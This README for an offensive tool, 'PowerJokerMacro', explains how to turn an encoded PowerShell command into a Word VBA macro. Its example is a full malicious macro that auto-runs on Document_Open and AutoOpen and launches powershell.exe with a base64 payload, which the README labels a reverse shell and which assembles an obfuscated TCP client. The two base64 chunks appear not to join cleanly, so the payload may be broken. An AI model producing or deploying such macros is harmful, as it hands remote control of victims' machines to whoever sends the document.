# PowerJokerMacro

Tool used to create Word Macros using PowerJoker's base64 Encoded Command. Tool was created because of Microsoft Word's length limits, serves as a way to quickly resolve formatting issues.

To use:
`python3 pjsplitter.py

Then Paste the base64 Command in the input.

Your command will then be VBA formatted to be inserted to the word macro

For Example:
In a Word macro use the following for a PowerJoker Rev Shell
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
  Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")

    Dim encodedCommand As String
    encodedCommand = "JABzAHQAcgAgAD0AIAAiAFQAYwBQACIAKwAiAEMAIgArACIAbABpACIAKwAiAGUAIgArACIAbgB0ACIAOwAkAHIAZQB2AGUAcgBzAGUAZAAgAD0AIAAtAGoAbwBpAG4AIAAoACQAcwB0AHIAWwAtADEALgAuAC0AKAAkAHMAdAByAC4ATABlAG4AZwB0AGgAKQBdACkAOwAKACQAUABKACAAPQAgAEAAKAAiADUANAAiACwAIAAiADQAMwAiACwAIAAiADUAMAAiACwAIAAiADQAMwAiACwAIAAiADYAQwAiACwAIAAiADYAOQAiACwAIAAiADYANQAiACwAIAAiADYARQAiACwAIAAiADcANAAiACkAOwAKACQAVABDAGgAYQByACAAPQAgACQAUABKACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsAIABbAGMAaABhAHIAXQBbAGMAbwBuAHYAZQByAHQAXQA6" & _
"AHMAdQBOAGsAegBHAFAASwBIAC4AVwByAGkAdABlACgAJABzACwAMAAsACQAcwAuAEwAZQBuAGcAdABoACkAOwAkAHMAdQBOAGsAegBHAFAASwBIAC4ARgBsAHUAcwBoACgAKQB9ADsAJABkAE4AbwBMAEoAbwBQAHAAcgBoAC4AQwBsAG8AcwBlACgAKQAKAA=="

' Run the PowerShell command using the -EncodedCommand option
    objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 1, True
    
    Set objShell = Nothing
End Sub

```
